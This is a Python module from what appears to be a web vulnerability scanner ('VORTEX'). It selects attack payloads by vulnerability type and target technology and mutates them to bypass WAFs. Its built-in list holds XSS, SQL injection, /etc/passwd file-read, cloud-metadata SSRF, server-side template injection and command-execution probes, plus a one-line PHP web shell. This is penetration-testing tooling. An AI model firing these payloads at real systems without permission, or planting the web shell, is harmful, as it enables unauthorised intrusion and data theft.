"""
VORTEX Smart Payload System - V20.0 ULTIMATE
Context-aware payload management and selection

FEATURES:
- Technology-specific payload selection (PHP, Java, Node, etc.)
- Attack-specific categories (XSS, SQLi, LFI, SSTI)
- Curated top-tier payloads (based on SecLists frequencies)
- WAF bypass variations
- Intelligent payload mutation (V20.0)
- Context-aware encoding (V20.0)

ARCHITECTURE:
- PayloadManager: Central logic for selection
- PayloadDatabase: Structured storage of attack vectors
- MutationEngine: Intelligent payload mutation for WAF bypass
"""

import logging
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
from enum import Enum

# V20.0 - Mutation Engine Integration
try:
    from core.payloads.mutation_engine import global_mutation_engine, PayloadContext
    MUTATION_ENGINE_AVAILABLE = True
except ImportError:
    MUTATION_ENGINE_AVAILABLE = False
    logging.warning("Mutation Engine not available")

# PHASE 2.1 - SecLists Integration (DEPRECATED - using curated instead)
try:
    from core.payloads.seclists_loader import get_seclists_loader, PayloadCategory
    SECLISTS_AVAILABLE = True
except ImportError:
    SECLISTS_AVAILABLE = False
    logging.warning("SecLists loader not available")

# PHASE 2.1 REVISED - Curated Payload System
try:
    from core.payloads.curated_payloads import (
        get_curated_payload_db,
        PayloadTier,
        VulnType as CuratedVulnType
    )
    CURATED_AVAILABLE = True
except ImportError:
    CURATED_AVAILABLE = False
    logging.warning("Curated payload system not available")

# PHASE 2.2 - Framework-Specific Payloads
try:
    from core.payloads.framework_payloads import (
        get_framework_payload_db,
        FrameworkPayload
    )
    FRAMEWORK_PAYLOADS_AVAILABLE = True
except ImportError:
    FRAMEWORK_PAYLOADS_AVAILABLE = False
    logging.warning("Framework payload system not available")

# PHASE 2.3 - Modern Bypass Techniques
try:
    from core.payloads.modern_bypass import (
        get_modern_bypass_db,
        BypassTechnique
    )
    MODERN_BYPASS_AVAILABLE = True
except ImportError:
    MODERN_BYPASS_AVAILABLE = False
    logging.warning("Modern bypass system not available")

logger = logging.getLogger(__name__)


class PayloadType(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    RCE = "rce"
    SSTI = "ssti"
    XXE = "xxe"
    SSRF = "ssrf"


class Technology(str, Enum):
    GENERIC = "generic"
    PHP = "php"
    JAVA = "java"
    PYTHON = "python"
    NODE = "node"
    RUBY = "ruby"
    ASP = "asp"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    MSSQL = "mssql"
    ORACLE = "oracle"


@dataclass
class Payload:
    content: str
    attack_type: PayloadType
    technologies: List[Technology] = field(default_factory=lambda: [Technology.GENERIC])
    description: str = ""
    tags: List[str] = field(default_factory=list)


class PayloadDatabase:
    """Curated database of high-impact payloads."""
    
    def __init__(self):
        self.payloads: List[Payload] = []
        self._load_defaults()
    
    def _load_defaults(self):
        """Load curated high-frequency payloads."""
        
        # --- XSS PAYLOADS ---
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>",
            "{{constructor.constructor('alert(1)')()}}"  # Angular/Vue
        ]
        for p in xss_payloads:
            self.payloads.append(Payload(p, PayloadType.XSS, [Technology.GENERIC], "Basic XSS"))

        # --- SQLi PAYLOADS ---
        sqli_generic = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT 1,2,3--",
            "admin' --",
            "sleep(5)#"
        ]
        for p in sqli_generic:
            self.payloads.append(Payload(p, PayloadType.SQLI, [Technology.GENERIC], "Generic SQLi"))
            
        # MySQL specific
        self.payloads.append(Payload("1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ", PayloadType.SQLI, [Technology.MYSQL], "MySQL Sleep"))
        self.payloads.append(Payload("VERSION()", PayloadType.SQLI, [Technology.MYSQL], "MySQL Version"))
        
        # PostgreSQL specific
        self.payloads.append(Payload("1; SELECT pg_sleep(5);", PayloadType.SQLI, [Technology.POSTGRES], "Postgres Sleep"))
        
        # --- LFI PAYLOADS ---
        lfi_unix = [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "/etc/passwd",
            "file:///etc/passwd"
        ]
        for p in lfi_unix:
            self.payloads.append(Payload(p, PayloadType.LFI, [Technology.GENERIC], "Unix LFI"))
            
        lfi_windows = [
            "..\\..\\..\\..\\windows\\win.ini",
            "C:\\Windows\\win.ini"
        ]
        for p in lfi_windows:
            self.payloads.append(Payload(p, PayloadType.LFI, [Technology.GENERIC], "Windows LFI"))
            
        # PHP specific triggers
        self.payloads.append(Payload("php://filter/convert.base64-encode/resource=index.php", PayloadType.LFI, [Technology.PHP], "PHP Wrapper"))
        
        # --- SSRF PAYLOADS ---
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://169.254.169.254/latest/meta-data/"
        ]
        for p in ssrf_payloads:
            self.payloads.append(Payload(p, PayloadType.SSRF, [Technology.GENERIC], "Generic SSRF"))
        
        # --- RCE PAYLOADS ---
        self.payloads.append(Payload("<?php system($_GET['cmd']); ?>", PayloadType.RCE, [Technology.PHP], "PHP Shell"))
        self.payloads.append(Payload("require('child_process').exec('id')", PayloadType.RCE, [Technology.NODE], "Node RCE"))
        self.payloads.append(Payload("__import__('os').popen('id').read()", PayloadType.RCE, [Technology.PYTHON], "Python RCE"))
        
        # --- SSTI PAYLOADS ---
        self.payloads.append(Payload("{{7*7}}", PayloadType.SSTI, [Technology.PYTHON, Technology.GENERIC], "Jinja2/Generic SSTI"))
        self.payloads.append(Payload("${7*7}", PayloadType.SSTI, [Technology.JAVA], "Java EL SSTI"))
        self.payloads.append(Payload("<%= 7*7 %>", PayloadType.SSTI, [Technology.RUBY], "ERB SSTI"))

        logger.info(f"Loaded {len(self.payloads)} default curated payloads")


class PayloadManager:
    """
    Intelligent manager for payload selection and mutation.
    
    V20.0: Now includes intelligent mutation engine for WAF bypass.
    PHASE 2.1: SecLists integration with 5000+ production-grade payloads.
    """
    
    def __init__(self,
                 use_curated: bool = True,
                 payload_tier: str = "tier_1",
                 enable_framework_payloads: bool = True,
                 enable_modern_bypass: bool = True):
        """
        Initialize payload manager.
        
        Args:
            use_curated: Enable curated payload system (default: True - RECOMMENDED)
            payload_tier: Payload tier to use (tier_1, tier_2, tier_3)
            enable_framework_payloads: Enable framework-specific payloads (PHASE 2.2)
            enable_modern_bypass: Enable modern bypass techniques (PHASE 2.3)
        """
        self.db = PayloadDatabase()
        
        # V20.0 - Mutation Engine Integration
        if MUTATION_ENGINE_AVAILABLE:
            self.mutation_engine = global_mutation_engine
            self.mutation_enabled = True
            logger.info("Payload Mutation Engine enabled")
        else:
            self.mutation_engine = None
            self.mutation_enabled = False
        
        # PHASE 2.1 REVISED - Curated Payload System (RECOMMENDED)
        if use_curated and CURATED_AVAILABLE:
            # Enable TIER 3 by default for full coverage (833 total payloads)
            self.curated_db = get_curated_payload_db(enable_tier3=True)
            self.curated_enabled = True
            self.payload_tier = PayloadTier(payload_tier)
            stats = self.curated_db.get_stats()
            logger.info(f"Curated payload system enabled (TIER: {payload_tier})")
            logger.info(f"Loaded {stats['tier_1']} TIER 1 + {stats['tier_2']} TIER 2 + {stats['tier_3']} TIER 3 = {stats['total']} total payloads")
        else:
            self.curated_db = None
            self.curated_enabled = False
            self.payload_tier = PayloadTier.TIER_1
        
        # PHASE 2.2 - Framework-Specific Payloads
        if enable_framework_payloads and FRAMEWORK_PAYLOADS_AVAILABLE:
            self.framework_db = get_framework_payload_db()
            self.framework_enabled = True
            fw_stats = self.framework_db.get_statistics()
            logger.info(f"Framework payload system enabled")
            logger.info(f"Loaded {fw_stats['total_payloads']} framework-specific payloads")
        else:
            self.framework_db = None
            self.framework_enabled = False
        
        # PHASE 2.3 - Modern Bypass Techniques
        if enable_modern_bypass and MODERN_BYPASS_AVAILABLE:
            self.modern_bypass_db = get_modern_bypass_db()
            self.modern_bypass_enabled = True
            mb_stats = self.modern_bypass_db.get_statistics()
            logger.info(f"Modern bypass techniques enabled")
            logger.info(f"Loaded {mb_stats['total_payloads']} modern bypass payloads")
        else:
            self.modern_bypass_db = None
            self.modern_bypass_enabled = False
        
        # PHASE 2.1 - SecLists Integration (FALLBACK - deprecated)
        self.seclists_loader = None
        self.seclists_enabled = False
    
    def get_payloads(self,
                     attack_type: Optional[PayloadType] = None,
                     technologies: Optional[List[Technology]] = None,
                     enable_mutations: bool = False,
                     max_mutations: int = 5,
                     use_curated: bool = True,
                     tier: Optional[PayloadTier] = None,
                     framework: Optional[str] = None,
                     response_headers: Optional[dict] = None,
                     enable_modern_bypass: bool = False,
                     bypass_technique: Optional[str] = None) -> List[str]:
        """
        Get payloads filtered by context, with optional mutations.
        
        Args:
            attack_type: Specific attack category (e.g., XSS)
            technologies: Detected technologies (e.g., [PHP, MYSQL])
            enable_mutations: Enable payload mutations for WAF bypass (V20.0)
            max_mutations: Maximum mutations per payload (V20.0)
            use_curated: Use curated payload system (RECOMMENDED)
            tier: Override default tier (None = use manager's default)
            framework: Target framework (laravel, django, rails, spring, express, flask) - PHASE 2.2
            response_headers: HTTP headers for framework detection - PHASE 2.2
            enable_modern_bypass: Include modern bypass techniques (PHASE 2.3)
            bypass_technique: Specific bypass technique (csp_bypass, prototype_pollution, etc.) - PHASE 2.3
        
        Returns:
            List of payload strings (with mutations if enabled)
        """
        base_payloads = []
        
        # PHASE 2.2 - Auto-detect framework if not specified
        if not framework and response_headers and self.framework_enabled:
            framework = self.framework_db.detect_framework(response_headers)
            if framework:
                logger.info(f"Auto-detected framework: {framework}")
        
        # PHASE 2.2 - Framework-specific payloads (highest priority)
        if framework and self.framework_enabled and self.framework_db:
            # Map PayloadType to framework vuln_type string
            framework_type_map = {
                PayloadType.XSS: 'xss',
                PayloadType.SQLI: 'sqli',
                PayloadType.LFI: 'lfi',
                PayloadType.SSRF: 'ssrf',
                PayloadType.SSTI: 'ssti',
                PayloadType.XXE: 'xxe',
                PayloadType.RCE: 'rce',
            }
            
            if attack_type and attack_type in framework_type_map:
                vuln_type_str = framework_type_map[attack_type]
                framework_payloads = self.framework_db.get_payloads(
                    framework=framework,
                    vuln_type=vuln_type_str
                )
                
                # Extract payload strings from FrameworkPayload objects
                framework_payload_strings = [fp.payload for fp in framework_payloads]
                base_payloads.extend(framework_payload_strings)
                
                logger.info(
                    f"Added {len(framework_payload_strings)} {framework}-specific payloads for {attack_type}"
                )
        
        # PHASE 2.3 - Modern bypass techniques
        if enable_modern_bypass and self.modern_bypass_enabled and self.modern_bypass_db:
            if bypass_technique:
                bypass_enum = BypassTechnique(bypass_technique)
                modern_payloads = self.modern_bypass_db.get_payloads(technique=bypass_enum)
            else:
                # Get relevant bypasses for attack type
                if attack_type == PayloadType.XSS:
                    modern_payloads = self.modern_bypass_db.get_payloads(
                        technique=BypassTechnique.MODERN_XSS
                    )
                    modern_payloads.extend(self.modern_bypass_db.get_payloads(
                        technique=BypassTechnique.CSP_BYPASS
                    ))
                else:
                    modern_payloads = []
            
            modern_payload_strings = [mp.payload for mp in modern_payloads]
            base_payloads.extend(modern_payload_strings)
            
            if modern_payload_strings:
                logger.info(
                    f"Added {len(modern_payload_strings)} modern bypass payloads for {attack_type}"
                )
        
        # PHASE 2.1 REVISED - Use curated payloads (RECOMMENDED)
        if use_curated and self.curated_enabled and self.curated_db:
            # Map PayloadType to CuratedVulnType
            curated_type_map = {
                PayloadType.XSS: CuratedVulnType.XSS,
                PayloadType.SQLI: CuratedVulnType.SQLI,
                PayloadType.LFI: CuratedVulnType.LFI,
                PayloadType.SSRF: CuratedVulnType.SSRF,
                PayloadType.SSTI: CuratedVulnType.SSTI,
                PayloadType.XXE: CuratedVulnType.XXE,
                PayloadType.RCE: CuratedVulnType.COMMAND_INJECTION,
            }
            
            use_tier = tier if tier else self.payload_tier
            
            if attack_type and attack_type in curated_type_map:
                # Specific attack type requested
                curated_type = curated_type_map[attack_type]
                curated_payloads = self.curated_db.get_payload_strings(
                    vuln_type=curated_type,
                    tier=use_tier
                )
                base_payloads.extend(curated_payloads)
                # Tier name için enum veya integer kontrolü
                tier_name = use_tier.value if hasattr(use_tier, 'value') else use_tier
                logger.info(
                    f"Added {len(curated_payloads)} curated TIER {tier_name} payloads for {attack_type}"
                )
            elif not attack_type:
                # No attack type specified - return ALL payloads for the tier
                for curated_type in CuratedVulnType:
                    curated_payloads = self.curated_db.get_payload_strings(
                        vuln_type=curated_type,
                        tier=use_tier
                    )
                    base_payloads.extend(curated_payloads)
                # Tier name için enum veya integer kontrolü
                tier_name = use_tier.value if hasattr(use_tier, 'value') else use_tier
                logger.info(
                    f"Added {len(base_payloads)} total curated TIER {tier_name} payloads (all types)"
                )
        
        # Fallback to built-in payloads if no curated/framework payloads
        if not base_payloads:
            # Fallback to built-in payloads
            candidates = self.db.payloads
            
            # Filter by attack type
            if attack_type:
                candidates = [p for p in candidates if p.attack_type == attack_type]
            
            # Filter by technology
            if technologies:
                tech_set = set(technologies + [Technology.GENERIC])
                candidates = [p for p in candidates if any(t in tech_set for t in p.technologies)]
            
            # Extract content from built-in payloads
            base_payloads = [p.content for p in candidates]
        
        # V20.0 - Apply mutations if enabled
        if enable_mutations and self.mutation_enabled and self.mutation_engine:
            mutated_payloads = []
            
            for payload in base_payloads:
                # Determine context from attack type
                context = self._get_payload_context(attack_type)
                
                # Generate mutations
                mutations = self.mutation_engine.mutate(
                    payload=payload,
                    context=context,
                    max_mutations=max_mutations
                )
                
                mutated_payloads.extend(mutations)
            
            logger.info(
                f"Generated {len(mutated_payloads)} payloads "
                f"({len(base_payloads)} base + mutations)"
            )
            
            return mutated_payloads
        
        return base_payloads
    
    def _get_payload_context(self, attack_type: Optional[PayloadType]) -> PayloadContext:
        """
        Map attack type to payload context for mutation engine.
        
        Args:
            attack_type: Attack type
            
        Returns:
            PayloadContext enum value
        """
        if not attack_type:
            return PayloadContext.GENERIC
        
        context_map = {
            PayloadType.XSS: PayloadContext.HTML,
            PayloadType.SQLI: PayloadContext.SQL,
            PayloadType.LFI: PayloadContext.URL,
            PayloadType.SSTI: PayloadContext.GENERIC,
            PayloadType.XXE: PayloadContext.GENERIC,
            PayloadType.SSRF: PayloadContext.URL,
            PayloadType.RCE: PayloadContext.GENERIC
        }
        
        return context_map.get(attack_type, PayloadContext.GENERIC)
    
    def get_all_payloads(self, include_seclists: bool = False) -> Dict[str, List[str]]:
        """
        Get all payloads grouped by type.
        
        Args:
            include_seclists: Include SecLists payloads (can be large)
        
        Returns:
            Dictionary of attack_type -> List[payload]
        """
        result = {}
        
        # Built-in payloads
        for p in self.db.payloads:
            if p.attack_type not in result:
                result[p.attack_type] = []
            result[p.attack_type].append(p.content)
        
        # PHASE 2.1 - Add SecLists payloads if requested
        if include_seclists and self.seclists_enabled and self.seclists_loader:
            category_map = {
                PayloadType.XSS: PayloadCategory.XSS,
                PayloadType.SQLI: PayloadCategory.SQLI,
                PayloadType.LFI: PayloadCategory.LFI,
                PayloadType.SSRF: PayloadCategory.SSRF,
                PayloadType.SSTI: PayloadCategory.SSTI,
                PayloadType.XXE: PayloadCategory.XXE,
                PayloadType.RCE: PayloadCategory.COMMAND_INJECTION,
            }
            
            for payload_type, category in category_map.items():
                seclists_payloads = self.seclists_loader.get_payloads(category=category)
                if payload_type not in result:
                    result[payload_type] = []
                result[payload_type].extend(seclists_payloads)
        
        return result
    
    def get_stats(self) -> Dict:
        """
        Get payload statistics.
        
        Returns:
            Dictionary with payload counts and system info
        """
        stats = {
            'built_in_payloads': len(self.db.payloads),
            'mutation_engine': self.mutation_enabled,
            'curated_enabled': self.curated_enabled,
            'framework_enabled': self.framework_enabled,
            'system': 'curated' if self.curated_enabled else 'built-in'
        }
        
        # Curated payload stats (RECOMMENDED)
        if self.curated_enabled and self.curated_db:
            curated_stats = self.curated_db.get_stats()
            stats['curated'] = curated_stats
            stats['active_tier'] = self.payload_tier.value
            stats['production_safe'] = (self.payload_tier == PayloadTier.TIER_1)
        
        # PHASE 2.2 - Framework payload stats
        if self.framework_enabled and self.framework_db:
            framework_stats = self.framework_db.get_statistics()
            stats['framework'] = framework_stats
        
        # Legacy SecLists stats (DEPRECATED)
        if self.seclists_enabled and self.seclists_loader:
            seclists_stats = self.seclists_loader.get_stats()
            stats['seclists_total'] = seclists_stats.get('total_payloads', 0)
            stats['seclists_categories'] = seclists_stats.get('categories_loaded', 0)
        
        return stats


# Global instance
global_payload_manager = PayloadManager()

def get_payload_manager() -> PayloadManager:
    return global_payload_manager
